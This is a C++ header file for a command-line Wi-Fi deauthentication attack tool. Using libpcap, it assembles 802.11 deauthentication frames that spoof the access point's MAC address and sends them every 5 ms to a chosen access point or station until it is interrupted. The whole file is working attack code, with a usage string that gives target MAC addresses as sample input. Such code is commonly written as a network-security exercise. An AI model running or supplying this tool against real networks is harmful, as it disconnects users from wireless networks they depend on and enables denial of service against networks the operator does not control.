#pragma once
#include <cstdio>
#include <unistd.h>
#include <signal.h>
#include <pcap.h>

#include "mac.h"
#include "802-11.h"

extern bool chk;

#define USLEEP 5000

void usage()
{
    puts("syntax : deauth-attack <interface> <ap mac> [<station mac>]");
    puts("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB");
}

void sigint_handler(int signo)
{
    chk = false;
    putchar('\n');
}

void trigger(pcap_t* handle, DF& pkt)
{
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&pkt), sizeof(DF));
     if (res != 0) fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
}

int deauth(char* dev, Mac& ap, Mac& station)
{
    signal(SIGINT,sigint_handler);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 100, errbuf);
    if (handle == NULL)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    
    DF packet;
    
    packet.radiotap.revision = packet.radiotap.pad = 0;
    packet.radiotap.hdr_len = 0xb;
    packet.radiotap.present_flg = 0x00028000;
    
    packet.zero_pad[0] = packet.zero_pad[1] = packet.zero_pad[2] = 0;

    packet.deauth.version = 0;
    packet.deauth.type = 0;
    packet.deauth.flags = 0;
    packet.deauth.subtype = 0xc;
    packet.deauth.duration = 314;
    packet.deauth.dst = station;
    packet.deauth.src = ap;
    packet.deauth.bssid = ap;
    packet.deauth.frag_seq = 0;

    packet.reason = 7;
    
    while(chk)
    {
        trigger(handle,packet);
        usleep(USLEEP);
    }
    pcap_close(handle);
    return 0;
}